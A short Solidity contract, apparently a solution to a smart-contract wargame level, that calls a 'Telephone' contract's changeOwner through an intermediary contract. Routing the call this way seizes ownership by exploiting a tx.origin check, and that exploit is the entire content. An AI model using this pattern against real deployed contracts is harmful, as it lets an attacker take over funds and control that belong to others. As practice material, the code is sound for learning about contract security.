contract CheatTelephone{
    Telephone telContract;
    constructor(address _adr) public{
        telContract=Telephone(_adr);
    }
    function chgeOwner(address _adr) public {
        telContract.changeOwner(_adr);
    }
}
